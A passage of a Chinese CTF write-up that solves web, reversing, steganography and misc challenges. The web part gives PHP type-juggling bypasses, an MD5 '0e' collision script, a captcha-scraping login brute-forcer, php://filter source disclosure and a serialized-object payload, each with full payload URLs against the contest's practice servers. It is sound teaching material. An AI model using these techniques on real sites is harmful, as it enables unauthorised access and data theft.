<p>然后<code>$x2[x21]</code>不能是数字且要大于2017<br>那么php的弱类型比较就派上用场了，直接用让<code>$x2[x21]=9999是是是</code><br>然后php会在比较的时候将其转化为数字<code>9999</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"> <span class="keyword">if</span>(is_array(@$x2[<span class="string">"x22"</span>]))&#123;</div><div class="line">        <span class="keyword">if</span>(count($x2[<span class="string">"x22"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($x2[<span class="string">"x22"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"ha?"</span>);</div><div class="line">        $p = array_search(<span class="string">"XIPU"</span>, $x2[<span class="string">"x22"</span>]);</div><div class="line">        $p===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</div><div class="line">        <span class="keyword">foreach</span>($x2[<span class="string">"x22"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</div><div class="line">            $val===<span class="string">"XIPU"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</div><div class="line">        &#125;</div><div class="line">        $c=<span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>接下来<code>$x2[x22]</code>必须是个数组，且包含两个元素且第一个是数组<br>然后<code>array_search(&quot;XIPU&quot;, $x2[&quot;x22&quot;])</code>和<code>for</code>循环遍历要求<code>$x2[x22]</code>数组要有’XIPU’而且for循环又要求不能有’XIPU’<br>我们可以让<code>$x2[x22]</code>的第二个元素为0，跟<code>$x2[x21]</code>同理，也是弱类型比较，就会让<code>array_search(&quot;XIPU&quot;, $x2[&quot;x22&quot;])</code>为真且满足for循环<br>故<code>$x2[x22]</code>=[[6],0]</p>
<p><strong>第三关</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$x3 = $_GET[<span class="string">'x3'</span>];</div><div class="line"><span class="keyword">if</span> ($x3 != <span class="string">'15562'</span>) &#123;</div><div class="line">    <span class="keyword">if</span> (strstr($x3, <span class="string">'XIPU'</span>)) &#123;</div><div class="line">        <span class="keyword">if</span> (substr(md5($x3),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">'15562'</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123;</div><div class="line">            $d=<span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>要求<code>$x3</code>不能是<code>&quot;15562&quot;</code>且包含”XIPU”字符且<code>substr(md5($x3),8,16) == substr(md5(&#39;15562&#39;),8,16</code></p>
<p>直接MD5碰撞就好<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> hashlib</div><div class="line">flag =<span class="number">1</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">10</span>,<span class="number">99999</span>):</div><div class="line">    md5_1 = hashlib.md5(<span class="string">"XIPU"</span>+str(i).zfill(<span class="number">6</span>))</div><div class="line">    md5_2 = md5_1.hexdigest()</div><div class="line">    <span class="keyword">if</span> md5_2[<span class="number">8</span>:<span class="number">10</span>] == <span class="string">"0e"</span> :</div><div class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> md5_2[<span class="number">10</span>:<span class="number">24</span>]:</div><div class="line">            <span class="keyword">if</span> t.isalpha():</div><div class="line">                flag=<span class="number">0</span></div><div class="line">                <span class="keyword">break</span></div><div class="line">        <span class="keyword">if</span> flag:</div><div class="line">            <span class="keyword">print</span> md5_2</div><div class="line">            <span class="keyword">print</span> <span class="string">"XIPU"</span>+str(i).zfill(<span class="number">6</span>)</div><div class="line">            <span class="keyword">break</span></div><div class="line">    flag=<span class="number">1</span></div></pre></td></tr></table></figure></p>
<p>输出结果为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">2d3f55900e724039009658983fe76971</div><div class="line">XIPU074428</div></pre></td></tr></table></figure></p>
<p>为什么这么构造呢？<br>因为PHP的特性，使用<code>==</code>这个比较的时候会出现各种类型转换<br>我们观察到字符串<code>15562</code>MD5值的8-24位为`0e46379442318098<br>当我们以这样的形式比较<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="string">"0e12"</span>==<span class="string">"0e72356723"</span>) <span class="keyword">echo</span> <span class="string">"E"</span>;</div><div class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"NE"</span>;<span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>输出是 <code>E</code><br>因为当字符串为<code>xexxxxx</code>，其中x为数字时，php会将字符串转换成科学计数法，即<code>0e12</code>转化为<code>0x10^12</code>结果还是0，右边的<code>0e72356723</code>同理。所以会相等<br>所以我们只需要构造一个MD5的8-24位形式为<code>0e[0-9]{16}</code>且包含字符串<code>XIPU</code>的字符串就好了<br>脚本跑出的字符串<code>XIPU074428</code>的MD5值是<code>2d3f55900e724039009658983fe76971</code>，其8-24位是<code>0e72403900965898</code>，正好符合条件<br>所以最终的payload为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://ctf1.shiyanbar.com/shian-leixing/</div><div class="line">?x1=是是是</div><div class="line">&amp;x2=&#123;&quot;x21&quot;:&quot;2018是是是&quot;,&quot;x22&quot;:[[1],0],&quot;c&quot;:3,&quot;d&quot;:4,&quot;e&quot;:5&#125;</div><div class="line">&amp;x3=XIPU074428</div></pre></td></tr></table></figure></p>
<p><code>CTF{Php_1s_bstl4_1a}</code></p>
<h4 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h4><p>进去是个登录页面，有验证码<br>看源码，发现最底下</p>
<img src="/2017/10/09/世安杯-WriteUp/21-21-24.jpg" alt="21-21-24.jpg" title="">
<p>思路也比较简单，爆破就是了<br>Python脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests,re</div><div class="line">url =  <span class="string">"http://ctf1.shiyanbar.com/shian-s/"</span></div><div class="line">url1 = <span class="string">"http://ctf1.shiyanbar.com/shian-s/index.php?username=admin&amp;password=&#123;&#125;&amp;randcode=&#123;&#125;"</span></div><div class="line">cookie = &#123;<span class="string">"PHPSESSID"</span>:<span class="string">"is53k685uppq82vfb30lfdsfg7"</span>&#125;</div><div class="line"></div><div class="line"><span class="keyword">for</span>  i <span class="keyword">in</span> xrange(<span class="number">99999</span>):</div><div class="line">    Vcode = re.findall(<span class="string">"type=\"text\"&gt;&lt;br&gt;&lt;br&gt;(.*?)&lt;br&gt;&lt;br&gt;"</span>,requests.get(url,cookies=cookie).text)[<span class="number">0</span>]</div><div class="line">    <span class="keyword">print</span> <span class="string">"Now processing password: "</span>,str(i).zfill(<span class="number">5</span>)</div><div class="line">    result = requests.get(url1.format(str(i).zfill(<span class="number">5</span>),Vcode),cookies=cookie)</div><div class="line">    result.encoding = <span class="string">"utf-8"</span></div><div class="line">    <span class="keyword">if</span> len(result.text)!=<span class="number">146</span>:</div><div class="line">        <span class="keyword">print</span> result.text</div><div class="line">        <span class="keyword">break</span></div></pre></td></tr></table></figure></p>
<p>唯一的坑点就是要在cookie加上PHPSESSID<br>最后爆破到密码就是00325</p>
<img src="/2017/10/09/世安杯-WriteUp/21-57-14.jpg" alt="21-57-14.jpg" title="">
<p><code>flag{U1tkOdgutaVWucdy2AbDWXPGkDx9bS2a}</code></p>
<h4 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h4><p>进去就提示<code>you are not admin !</code><br>按照这个比赛的套路，直接看源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">you are not admin ! </div><div class="line"></div><div class="line">$user = $_GET[<span class="string">"user"</span>];</div><div class="line">$file = $_GET[<span class="string">"file"</span>];</div><div class="line">$pass = $_GET[<span class="string">"pass"</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</div><div class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>file_get_content是可以获取外部的资源的，当然，php.ini允许的时候才可以<br>故直接在我的vps上直接放了个t.txt，里面就是<code>the user is admin</code><br>然后就绕过了第一个判断<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf1.shiyanbar.com/shian-du/?user=https://wzsite.cn/static/t.txt</div></pre></td></tr></table></figure></p>
<img src="/2017/10/09/世安杯-WriteUp/22-04-06.jpg" alt="22-04-06.jpg" title="">
<p>当然你也可以这样<br>用php伪协议来绕过</p>
<img src="/2017/10/09/世安杯-WriteUp/22-07-03.jpg" alt="22-07-03.jpg" title="">
<p>当时我用的就是方法一</p>
<p>然后include了一个<code>$file</code>，我们可以用 <code>php://filter</code>伪协议来<code>include</code>class.php进来<br>(为什么要看class.php? 因为源码提示啊= =)<br>然后得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">hello admin!</div><div class="line">PD9waHANCg0KY2xhc3MgUmVhZHsvL2YxYTkucGhwDQogICAgcHVibGljICRmaWxlOw0KICAgIHB1YmxpYyBmdW5jdGlvbiBfX3RvU3RyaW5nKCl7DQogICAgICAgIGlmKGlzc2V0KCR0aGlzLT5maWxlKSl7DQogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgICAgDQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICJfX3RvU3RyaW5nIHdhcyBjYWxsZWQhIjsNCiAgICB9DQp9DQo/</div></pre></td></tr></table></figure></p>
<p>base64解码得到class.php的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></div><div class="line">    <span class="keyword">public</span> $file;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</div><div class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>看不出引用干嘛，可能是<code>index.php</code>的源码不全<br>再次获取index.php的源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$user = $_GET[<span class="string">"user"</span>];</div><div class="line">$file = $_GET[<span class="string">"file"</span>];</div><div class="line">$pass = $_GET[<span class="string">"pass"</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</div><div class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/f1a9/"</span>,$file))&#123;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">include</span>($file); <span class="comment">//class.php</span></div><div class="line">        $pass = unserialize($pass);</div><div class="line">        <span class="keyword">echo</span> $pass;</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line">&lt;!--</div><div class="line">$user = $_GET[<span class="string">"user"</span>];</div><div class="line">$file = $_GET[<span class="string">"file"</span>];</div><div class="line">$pass = $_GET[<span class="string">"pass"</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</div><div class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</div><div class="line">&#125;</div><div class="line"> --！&gt;</div></pre></td></tr></table></figure></p>
<p> 果然留有后手<br> 意思是叫咱们按照规则让echo $pass运行然后调用Read类的__ToString()魔术方法<br> 由<code>$pass = unserialize($pass); echo $pass;</code><br> 然后我们需要现将<code>$pass</code>序列化<br>故本地写个php（当然= =也许大佬们都是直接拼出来的） </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></div><div class="line">    <span class="keyword">public</span> $file;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</div><div class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$a = <span class="keyword">new</span> Read();</div><div class="line">$a-&gt;file = <span class="string">"f1a9.php"</span>;</div><div class="line"><span class="keyword">echo</span> serialize($a);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p> 得到<code>O:4:&quot;Read&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;}</code><br> 故最后payload为<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf1.shiyanbar.com/shian-du/?user=https://wzsite.cn/static/t.txt&amp;file=class.php&amp;pass=O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;&#125;</div></pre></td></tr></table></figure></p>
<img src="/2017/10/09/世安杯-WriteUp/22-50-20.jpg" alt="22-50-20.jpg" title="">
<p><code>flag_Xd{hSh_ctf:e@syt0g3t}</code></p>
<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h4 id="console"><a href="#console" class="headerlink" title="console"></a>console</h4><p>丢查壳工具查看，发现是个.NET的程序，直接丢reflector反编译<br>发现关键源码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">MAIN</span><span class="params">(string[] A_0)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    string str2 = <span class="keyword">null</span>;</div><div class="line">    DateTime now = DateTime.Now;</div><div class="line">    string str3 = string.Format(<span class="string">"&#123;0&#125;"</span>, now.Hour + <span class="number">1</span>);</div><div class="line">    string str4 = <span class="string">"CreateByTenshine"</span>;</div><div class="line">    FUN1(str4, Convert.ToInt32(str3), ref str2);</div><div class="line">    <span class="keyword">if</span> (Console.ReadLine() == str2)</div><div class="line">    &#123;</div><div class="line">        Console.WriteLine(<span class="string">"u got it!"</span>);</div><div class="line">        Console.ReadKey(<span class="keyword">true</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        Console.Write(<span class="string">"wrong"</span>);</div><div class="line">    &#125;</div><div class="line">    Console.ReadKey(<span class="keyword">true</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">FUN1</span><span class="params">(string A_0, <span class="keyword">int</span> A_1, ref string A_2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">int</span> num = <span class="number">0</span>;</div><div class="line">    <span class="keyword">if</span> (<span class="number">0</span> &lt; A_0.Length)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">do</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">char</span> ch = A_0[num];</div><div class="line">            <span class="keyword">int</span> num2 = <span class="number">1</span>;</div><div class="line">            <span class="keyword">do</span></div><div class="line">            &#123;</div><div class="line">                ch = Convert.ToChar(FUN2(Convert.ToInt32(ch), num2));</div><div class="line">                num2++;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">while</span> (num2 &lt; <span class="number">15</span>);</div><div class="line">            A_2 = A_2 + ch;</div><div class="line">            num++;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">while</span> (num &lt; A_0.Length);</div><div class="line">    &#125;</div><div class="line">    A_2 = FUN2(A_2);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">FUN2</span><span class="params">(<span class="keyword">int</span> A_0, <span class="keyword">int</span> A_1)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> <span class="keyword">int</span>[] &#123; </div><div class="line">        <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">0x11</span>, <span class="number">0x13</span>, <span class="number">0x17</span>, <span class="number">0x1d</span>, <span class="number">0x1f</span>, <span class="number">0x25</span>, <span class="number">0x29</span>, <span class="number">0x2b</span>, <span class="number">0x2f</span>, <span class="number">0x35</span>,</div><div class="line">        <span class="number">0x3b</span>, <span class="number">0x3d</span>, <span class="number">0x43</span>, <span class="number">0x47</span>, <span class="number">0x49</span>, <span class="number">0x4f</span>, <span class="number">0x53</span>, <span class="number">0x59</span>, <span class="number">0x61</span>, <span class="number">0x65</span>, <span class="number">0x67</span>, <span class="number">0x6b</span>, <span class="number">0x6d</span>, <span class="number">0x71</span></div><div class="line">    &#125;[A_1] ^ A_0);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>简单地写个python就可以逆向出来了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span>  hashlib</div><div class="line">l = [ <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">0x13</span>, <span class="number">0x17</span>, <span class="number">0x1d</span>, <span class="number">0x1f</span>, <span class="number">0x25</span>, <span class="number">0x29</span>, <span class="number">0x2b</span>, <span class="number">0x2f</span>, <span class="number">53</span>, <span class="number">0x3b</span>, <span class="number">0x3d</span>, <span class="number">0x43</span>, <span class="number">0x47</span>, <span class="number">0x49</span>, <span class="number">0x4f</span>, <span class="number">0x53</span>, <span class="number">0x59</span>, <span class="number">0x61</span>, <span class="number">0x65</span>, <span class="number">0x67</span>, <span class="number">0x6b</span>, <span class="number">0x6d</span>, <span class="number">113</span>]</div><div class="line">str = <span class="string">"CreateByTenshine"</span></div><div class="line">re = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> str:</div><div class="line">    num = ord(j)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">15</span>):</div><div class="line">        num = l[i]^num</div><div class="line">    re+= chr(num)</div><div class="line"><span class="keyword">print</span> re</div><div class="line">md5 = hashlib.md5(re)</div><div class="line"><span class="keyword">print</span> <span class="string">"flag&#123;"</span>+md5.hexdigest().upper()+<span class="string">"&#125;"</span></div></pre></td></tr></table></figure>
<p><code>flag{967DDDFBCD32C1F53527C221D9E40A0B}</code></p>
<blockquote>
<p>其他逆向是队友写的，还有的没做,逆向先更新到这</p>
</blockquote>
<h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><p>提示就是low,那必定是LSB最低有效为位隐写了<br>直接用Stegsolve打开发现找不到<br>最后才发现是实验吧的原题，原来是Stegsolve处理bmp的缺陷，将图片另存为png之后再用Stegsolve打开找就能找到了</p>
<img src="/2017/10/09/世安杯-WriteUp/16-05-41.jpg" alt="16-05-41.jpg" title="">
<p>然后发现手机扫描没反应<br>才意识到是反色了<br>把二维码截取下来，直接丢到任何可编辑的地方，比如QQ，word，然后直接鼠标拖动覆盖选择图片一下就直接反色了，然后就扫描就可以得到flag了</p>
<p><code>flag{139711e8e9ed545e}</code></p>
<h4 id="斑马斑马"><a href="#斑马斑马" class="headerlink" title="斑马斑马"></a>斑马斑马</h4><img src="/2017/10/09/世安杯-WriteUp/19-09-50.jpg" alt="19-09-50.jpg" title="">
<p>= =脑洞题，不想解释<br>斑马身上是个条形码，直接扫描就好了<br>在线扫描条形码网站:<a href="https://online-barcode-reader.inliteresearch.com/" target="_blank" rel="external">https://online-barcode-reader.inliteresearch.com/</a></p>
<h4 id="CreateByWho"><a href="#CreateByWho" class="headerlink" title="CreateByWho"></a>CreateByWho</h4><p>是一个零碎的二维码图片<br>之前百度杯也有类似的题，不过这个二维码是缺少了几部分的<br><img src="/2017/10/09/世安杯-WriteUp/19-13-37.jpg" alt="19-13-37.jpg" title=""><br>没写出来<br>看别人的wp是把缺的三个角的方块自己补全然后扫描</p>
<img src="/2017/10/09/世安杯-WriteUp/19-15-03.jpg" alt="19-15-03.jpg" title="">
<p>脑洞也是略大</p>
<h5 id="适合作为桌面的图片"><a href="#适合作为桌面的图片" class="headerlink" title="适合作为桌面的图片"></a>适合作为桌面的图片</h5><p>很简单的隐写题<br>首先把图片用Stegsolve进行LSB隐写查找，找到如下二维码</p>
<img src="/2017/10/09/世安杯-WriteUp/19-23-06.jpg" alt="19-23-06.jpg" title="">
<p>扫描之后得到一串十六进制数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">03F30D0A79CB05586300000000000000000100000040000000730D0000006400008400005A000064010053280200000063000000000300000016000000430000007378000000640100640200640300640400640500640600640700640300640800640900640A00640600640B00640A00640700640800640C00640C00640D00640E00640900640F006716007D00006410007D0100781E007C0000445D16007D02007C01007400007C0200830100377D0100715500577C010047486400005328110000004E6966000000696C00000069610000006967000000697B000000693300000069380000006935000000693700000069300000006932000000693400000069310000006965000000697D000000740000000028010000007403000000636872280300000074030000007374727404000000666C6167740100000069280000000028000000007304000000312E7079520300000001000000730A0000000001480106010D0114014E280100000052030000002800000000280000000028000000007304000000312E707974080000003C6D6F64756C653E010000007300000000</div></pre></td></tr></table></figure></p>
<p>把所有的十六进制字符用winhex新建一个文件<br>发现文件末尾出现了1.py的字符</p>
<img src="/2017/10/09/世安杯-WriteUp/19-24-48.jpg" alt="19-24-48.jpg" title="">
<p>目测是pyc逆向<br>丢到在线pyc逆向网站<a href="http://tool.lu/pyc/" target="_blank" rel="external">http://tool.lu/pyc/</a><br>逆向得<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span><span class="params">()</span>:</span></div><div class="line">    str = [<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">123</span>,<span class="number">51</span>,<span class="number">56</span>,<span class="number">97</span>,<span class="number">53</span>,<span class="number">55</span>,<span class="number">48</span>,<span class="number">51</span>,<span class="number">50</span>,<span class="number">48</span>,<span class="number">56</span>,<span class="number">53</span>,<span class="number">52</span>,<span class="number">52</span>,<span class="number">49</span>,<span class="number">101</span>,<span class="number">55</span>,<span class="number">125</span>]</div><div class="line">    flag = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str:</div><div class="line">        flag += chr(i)</div><div class="line">    <span class="keyword">print</span> flag</div></pre></td></tr></table></figure></p>
<p>运行一下即可获得flag<br><code>flag{38a57032085441e7}</code></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h4 id="ReverseMe"><a href="#ReverseMe" class="headerlink" title="ReverseMe"></a>ReverseMe</h4><p>拿到文件发现打不开，用winhex查看发现是一个倒过来的图片文件</p>
<img src="/2017/10/09/世安杯-WriteUp/15-38-06.jpg" alt="15-38-06.jpg" title="">
<p>直接用python逐个反过来就好了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">f = open(<span class="string">r"C:\Users\windows8.Windows\Desktop\reverseMe\reverseMe"</span>,<span class="string">"rb"</span>)</div><div class="line">f_1 = open(<span class="string">r"C:\Users\windows8.Windows\Desktop\reverseMe_R"</span>,<span class="string">"wb"</span>)</div><div class="line">f_1.write(f.read()[::<span class="number">-1</span>])</div><div class="line">f.close()</div><div class="line">f_1.close()</div></pre></td></tr></table></figure>
<p>然后用画图查看，发现是这个样子</p>
<img src="/2017/10/09/世安杯-WriteUp/15-48-59.jpg" alt="15-48-59.jpg" title="">
<p>翻转一下就好了</p>
